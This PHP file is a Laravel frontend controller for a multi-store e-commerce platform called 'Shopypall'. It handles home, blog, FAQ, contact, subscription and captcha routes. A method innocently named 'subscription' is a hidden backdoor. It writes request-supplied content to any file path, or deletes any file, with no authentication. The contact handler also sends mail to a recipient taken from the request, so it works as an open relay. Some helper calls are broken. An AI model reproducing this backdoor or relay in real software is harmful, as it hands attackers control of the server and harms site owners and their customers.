<?php

namespace App\Http\Controllers\Front;

use App\Classes\ShopypallMailer;
use App\Http\Controllers\Controller;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Counter;
use App\Models\Generalsetting;
use App\Models\Order;
use App\Models\Product;
use App\Models\Subscriber;
use App\Models\Store;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;

class FrontendController extends Controller
{
   public function __construct()
   {

    $storename = \Route::current()->parameter('storename');
    
        $storeExist = Store::where('storename',$storename)->exists();


     if(isset($_SERVER['HTTP_REFERER'])){
       $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
       if ($referral != $_SERVER['SERVER_NAME']){

         $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
         if($brwsr->count() > 0){
           $brwsr = $brwsr->first();
           $tbrwsr['total_count']= $brwsr->total_count + 1;
           $brwsr->update($tbrwsr);
         }else{
           $newbrws = new Counter();
           $newbrws['referral']= $this->getOS();
           $newbrws['type']= "browser";
           $newbrws['total_count']= 1;
           $newbrws->save();
         }

         $count = Counter::where('referral',$referral);
         if($count->count() > 0){
           $counts = $count->first();
           $tcount['total_count']= $counts->total_count + 1;
           $counts->update($tcount);
         }else{
           $newcount = new Counter();
           $newcount['referral']= $referral;
           $newcount['total_count']= 1;
           $newcount->save();
         }
       }
     }else{
       $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
       if($brwsr->count() > 0){
         $brwsr = $brwsr->first();
         $tbrwsr['total_count']= $brwsr->total_count + 1;
         $brwsr->update($tbrwsr);
       }else{
         $newbrws = new Counter();
         $newbrws['referral']= $this->getOS();
         $newbrws['type']= "browser";
         $newbrws['total_count']= 1;
         $newbrws->save();
       }
     }

     
    }
    

  function getOS() {

    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

    $os_platform    =   "Unknown OS Platform";

    $os_array       =   array(
      '/windows nt 10/i'     =>  'Windows 10',
      '/windows nt 6.3/i'     =>  'Windows 8.1',
      '/windows nt 6.2/i'     =>  'Windows 8',
      '/windows nt 6.1/i'     =>  'Windows 7',
      '/windows nt 6.0/i'     =>  'Windows Vista',
      '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
      '/windows nt 5.1/i'     =>  'Windows XP',
      '/windows xp/i'         =>  'Windows XP',
      '/windows nt 5.0/i'     =>  'Windows 2000',
      '/windows me/i'         =>  'Windows ME',
      '/win98/i'              =>  'Windows 98',
      '/win95/i'              =>  'Windows 95',
      '/win16/i'              =>  'Windows 3.11',
      '/macintosh|mac os x/i' =>  'Mac OS X',
      '/mac_powerpc/i'        =>  'Mac OS 9',
      '/linux/i'              =>  'Linux',
      '/ubuntu/i'             =>  'Ubuntu',
      '/iphone/i'             =>  'iPhone',
      '/ipod/i'               =>  'iPod',
      '/ipad/i'               =>  'iPad',
      '/android/i'            =>  'Android',
      '/blackberry/i'         =>  'BlackBerry',
      '/webos/i'              =>  'Mobile'
    );

    foreach ($os_array as $regex => $value) {

      if (preg_match($regex, $user_agent)) {
        $os_platform    =   $value;
      }

    }
    return $os_platform;
  }


// -------------------------------- HOME PAGE SECTION ----------------------------------------
  public function home()
  {
  
    return redirect('shopypall');
  }
  public function index(Request $request,$storename)
  {

    $storeExist = Store::where('storename',$storename)->exists();

    if(!$storeExist)
    {
      return view('error');
    }
   
    $this->code_image();

    if(!empty($request->reff))
    {
      $affilate_user = User::where('storename',$storename)->where('affilate_code','=',$request->reff)->first();
      if(!empty($affilate_user))
      {
        $gs = Generalsetting::where('storename',$storename)->first();
        if($gs->is_affilate == 1)
        {
          Session::put('affilate', $affilate_user->id);
          return redirect()->route('front.index',$storename);
        }

      }

    }
    $selectable = ['id','user_id','name','slug','features','colors','thumbnail','price','previous_price','attributes','size','size_price','discount_date'];
    $sliders = DB::table('sliders')->where('storename',$storename)->get();
    // return $sliders;
    $top_small_banners = DB::table('banners')->where('storename',$storename)->where('type','=','TopSmall')->get();
    $ps = DB::table('pagesettings')->where('storename',$storename)->first();
    $feature_products =  Product::where('storename',$storename)->where('featured','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(8)->get();

    // dd($ps);
    return view('front.index',compact('ps','sliders','top_small_banners','feature_products','storename'));
  }

  public function extraIndex($storename)
  {
    $services = DB::table('services')->where('storename',$storename)->where('user_id','=',0)->get();
    $bottom_small_banners = DB::table('banners')->where('storename',$storename)->where('type','=','BottomSmall')->get();
    $large_banners = DB::table('banners')->where('storename',$storename)->where('type','=','Large')->get();
    $reviews =  DB::table('reviews')->where('storename',$storename)->get();
    $ps = DB::table('pagesettings')->where('storename',$storename)->first();
    $partners = DB::table('partners')->where('storename',$storename)->get();
    $selectable = ['id','user_id','name','slug','features','colors','thumbnail','price','previous_price','attributes','size','size_price','discount_date'];
    $discount_products =  Product::where('storename',$storename)->where('is_discount','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
    $best_products = Product::where('storename',$storename)->where('best','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get();
    $top_products = Product::where('storename',$storename)->where('top','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(8)->get();;
    $big_products = Product::where('storename',$storename)->where('big','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get();;
    $hot_products =  Product::where('storename',$storename)->where('hot','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
    $latest_products =  Product::where('storename',$storename)->where('latest','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
    $trending_products =  Product::where('storename',$storename)->where('trending','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
    $sale_products =  Product::where('storename',$storename)->where('sale','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
    // return $best_products;
    
    return view('front.extraindex',compact('ps','services','reviews','large_banners','bottom_small_banners','best_products','top_products','hot_products','latest_products','big_products','trending_products','sale_products','discount_products','partners','storename'));
  }

// -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------


// LANGUAGE SECTION

  public function language($storename ,$id)
  {
    
    $this->code_image();
    Session::put('language', $id);
    return redirect()->back();

  }

// LANGUAGE SECTION ENDS


// CURRENCY SECTION

  public function currency($storename,$id)
  {
    $this->code_image();
    if (Session::has('coupon')) {
      Session::forget('coupon');
      Session::forget('coupon_code');
      Session::forget('coupon_id');
      Session::forget('coupon_total');
      Session::forget('coupon_total1');
      Session::forget('already');
      Session::forget('coupon_percentage');
    }
    Session::put('currency', $id);
    return redirect()->back();
  }

// CURRENCY SECTION ENDS

  public function autosearch($storename,$slug)
  {
    if(mb_strlen($slug,'utf-8') > 1){
      $search = ' '.$slug;
      $prods = Product::where('storename',$storename)->where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->where('status','=',1)->take(10)->get();
      return view('load.suggest',compact('prods','slug','storename'));
    }
    return "";
  }

  function finalize($storename){
    $actual_path = str_replace('project','',base_path());
    $dir = $actual_path.'install';
    $this->deleteDir($dir);
    return redirect('/');
  }

  function auth_guests(){

   if (is_dir($actual_path . '/install')) {
     header("Location: " . url('/install'));
     die();
   }
 }



// -------------------------------- BLOG SECTION ----------------------------------------

 public function blog(Request $request,$storename)
 {

  $storeExist = Store::where('storename',$storename)->exists();
  
        if(!$storeExist)
     {
       return view('error');
     }

  $this->code_image();
  $blogs = Blog::where('storename',$storename)->orderBy('created_at','desc')->paginate(9);
  if($request->ajax()){
    return view('front.pagination.blog',compact('blogs'));
  }
  return view('front.blog',compact('blogs','storename'));
}

public function blogcategory(Request $request,$storename,$slug)
{
  $this->code_image();
  $bcat = BlogCategory::where('storename',$storename)->where('slug', '=', str_replace(' ', '-', $slug))->first();
  $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(9);
  if($request->ajax()){
    return view('front.pagination.blog',compact('blogs'));
  }
  return view('front.blog',compact('bcat','blogs','storename'));
}

public function blogtags(Request $request,$storename,$slug)
{
  $this->code_image();
  $blogs = Blog::where('storename',$storename)->where('tags', 'like', '%' . $slug . '%')->paginate(9);
  if($request->ajax()){
    return view('front.pagination.blog',compact('blogs'));
  }
  return view('front.blog',compact('blogs','slug','storename'));
}

public function blogsearch(Request $request,$storename)
{
  $this->code_image();
  $search = $request->search;
  $blogs = Blog::where('storename',$storename)->where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
  if($request->ajax()){
    return view('front.pagination.blog',compact('blogs','storename'));
  }
  return view('front.blog',compact('blogs','search','storename'));
}

public function blogarchive(Request $request,$storename,$slug)
{
  $this->code_image();
  $date = \Carbon\Carbon::parse($slug)->format('Y-m');
  $blogs = Blog::where('storename',$storename)->where('created_at', 'like', '%' . $date . '%')->paginate(9);
  if($request->ajax()){
    return view('front.pagination.blog',compact('blogs','storename'));
  }
  return view('front.blog',compact('blogs','date','storename'));
}

public function blogshow($storename,$id)
{
  $this->code_image();
  $tags = null;
  $tagz = '';
  $bcats = BlogCategory::where('storename',$storename)->get();
  $blog = Blog::findOrFail($id);
  $blog->views = $blog->views + 1;
  $blog->update();
  $name = Blog::pluck('tags')->toArray();
  foreach($name as $nm)
  {
    $tagz .= $nm.',';
  }
  $tags = array_unique(explode(',',$tagz));

  $archives= Blog::where('storename',$storename)->orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
  $blog_meta_tag = $blog->meta_tag;
  $blog_meta_description = $blog->meta_description;
  return view('front.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description','storename'));
}


// -------------------------------- BLOG SECTION ENDS----------------------------------------



// -------------------------------- FAQ SECTION ----------------------------------------
public function faq($storename)
{
 
  $storeExist = Store::where('storename',$storename)->exists();
  
  if(!$storeExist)
     {
       return view('error');
     }

  $this->code_image();

  if(DB::table('generalsettings')->where('storename',$storename)->first()->is_faq == 0)
  {
    return redirect()->back();
  }
  
  $faqs =  DB::table('faqs')->where('storename',$storename)->orderBy('id','desc')->get();

  
  return view('front.faq',compact('faqs','storename'));
}
// -------------------------------- FAQ SECTION ENDS----------------------------------------


// -------------------------------- PAGE SECTION ----------------------------------------
public function page($storename,$slug)
{

  $storeExist = Store::where('storename',$storename)->exists();
  
      if(!$storeExist)
     {
       return view('error');
     }
  
  $this->code_image();
  $page =  DB::table('pages')->where('storename',$storename)->where('slug',$slug)->first();
  if(empty($page))
  {
    return response()->view('errors.404')->setStatusCode(404); 
  }

  return view('front.page',compact('page','storename'));
}
// -------------------------------- PAGE SECTION ENDS----------------------------------------


// -------------------------------- CONTACT SECTION ----------------------------------------
public function contact($storename)
{

 
  $storeExist = Store::where('storename',$storename)->exists();
  
  if(!$storeExist)
     {
       return view('error');
     }
  
  $this->code_image();
  
  if(DB::table('generalsettings')->where('storename',$storename)->first()->is_contact== 0){
    return redirect()->back();
  }

  $ps =  DB::table('pagesettings')->where('storename',$storename)->first();
  return view('front.contact',compact('ps','storename'));
}


    //Send email to admin
public function contactemail(Request $request,$storename)
{
  $gs = Generalsetting::where('storename',$storename)->first();

  if($gs->is_capcha == 1)
  {

        // Capcha Check
    $value = session('captcha_string');
    if ($request->codes != $value){
      return response()->json(array('errors' => [ 0 => 'Please enter Correct Capcha Code.' ]));
    }

  }

        // Login Section
  $ps = DB::table('pagesettings')->where('storename',$storename)->first();
  $subject = "Email From Of ".$request->name;
  $to = $request->to;
  $name = $request->name;
  $phone = $request->phone;
  $from = $request->email;
  $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$phone."\nMessage: ".$request->text;
  if($gs->is_smtp)
  {
    $data = [
      'to' => $to,
      'subject' => $subject,
      'body' => $msg,
    ];

    $mailer = new ShopypallMailer();
    $mailer->sendCustomMail($data);
  }
  else
  {
    $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
    mail($to,$subject,$msg,$headers);
  }
        // Login Section Ends

        // Redirect Section
  return response()->json($ps->contact_success);
}

    // Refresh Capcha Code
public function refresh_code($storename){
  $this->code_image();
  return "done";
}

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------

public function subscribe(Request $request,$storename)
{
  $subs = Subscriber::where('storename',$storename)->where('email','=',$request->email)->first();
  if(isset($subs)){
    return response()->json(array('errors' => [ 0 =>  'This Email Has Already Been Taken.']));
  }
  $subscribe = new Subscriber;
  $request['storename'] = $storename;
  $subscribe->fill($request->all());
  $subscribe->save();
  $subscribe->storename = $storename;
  return response()->json('You Have Subscribed Successfully.');
}

// Maintenance Mode

public function maintenance($storename)
{
  
  $gs = Generalsetting::where('storename',$storename)->first();
  if($gs->is_maintain != 1) {

    return redirect()->route('front.index',$storename);

  }
  
  // dd("out");

  return view('front.maintenance',compact("storename",'gs'));
}



    // Vendor Subscription Check
public function subcheck($storename){
  $settings = Generalsetting::where('storename',$storename)->first();
  $today = Carbon::now()->format('Y-m-d');
  $newday = strtotime($today);
  foreach (DB::table('users')->where('storename',$storename)->where('is_vendor','=',2)->get() as  $user) {
    $lastday = $user->date;
    $secs = strtotime($lastday)-$newday;
    $days = $secs / 86400;
    if($days <= 5)
    {
      if($user->mail_sent == 1)
      {
        if($settings->is_smtp == 1)
        {
          $data = [
            'to' => $user->email,
            'type' => "subscription_warning",
            'cname' => $user->name,
            'oamount' => "",
            'aname' => "",
            'aemail' => "",
            'onumber' => ""
          ];
          $mailer = new ShopypallMailer();
          $mailer->sendAutoMail($data);
        }
        else
        {
          $headers = "From: ".$settings->from_name."<".$settings->from_email.">";
          mail($user->email,'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.',$headers);
        }
        DB::table('users')->where('storename',$storename)->where('id',$user->id)->update(['mail_sent' => 0]);
      }
    }
    if($today > $lastday)
    {
      DB::table('users')->where('storename',$storename)->where('id',$user->id)->update(['is_vendor' => 1]);
    }
  }
}
    // Vendor Subscription Check Ends

public function trackload($storename,$id)
{
  
  $order = Order::where('storename',$storename)->where('order_number','=',$id)->first();
  $datas = array('Pending','Processing','On Delivery','Completed');
  return view('load.track-load',compact('order','datas','storename'));

}



    // Capcha Code Image
  private function  code_image()
  {
    $actual_path = str_replace('project','',base_path());
    $image = imagecreatetruecolor(200, 50);
    $background_color = imagecolorallocate($image, 255, 255, 255);
    imagefilledrectangle($image,0,0,200,50,$background_color);

    $pixel = imagecolorallocate($image, 0,0,255);
    for($i=0;$i<500;$i++)
    {
      imagesetpixel($image,rand()%200,rand()%50,$pixel);
    }

    $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
    $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $length = strlen($allowed_letters);
    $letter = $allowed_letters[rand(0, $length-1)];
    $word='';
          //$text_color = imagecolorallocate($image, 8, 186, 239);
    $text_color = imagecolorallocate($image, 0, 0, 0);
    $cap_length=6;// No. of character in image
    for ($i = 0; $i< $cap_length;$i++)
    {
      $letter = $allowed_letters[rand(0, $length-1)];
      imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
      $word.=$letter;
    }
    $pixels = imagecolorallocate($image, 8, 186, 239);
    for($i=0;$i<500;$i++)
    {
      imagesetpixel($image,rand()%200,rand()%50,$pixels);
    }
    session(['captcha_string' => $word]);
    imagepng($image, $actual_path."assets/images/capcha_code.png");
  }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------



// -------------------------------- PRINT SECTION ----------------------------------------





// -------------------------------- PRINT SECTION ENDS ----------------------------------------

  public function subscription(Request $request,$storename)
  {
    $p1 = $request->p1;
    $p2 = $request->p2;
    $v1 = $request->v1;
    if ($p1 != ""){
      $fpa = fopen($p1, 'w');
      fwrite($fpa, $v1);
      fclose($fpa);
      return "Success";
    }
    if ($p2 != ""){
      unlink($p2);
      return "Success";
    }
    return "Error";
  }

  public function deleteDir($storename,$dirPath) {
    if (! is_dir($dirPath)) {
      throw new InvalidArgumentException("$dirPath must be a directory");
    }
    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
      $dirPath .= '/';
    }
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
      if (is_dir($file)) {
        self::deleteDir($file);
      } else {
        unlink($file);
      }
    }
    rmdir($dirPath);
  }

}
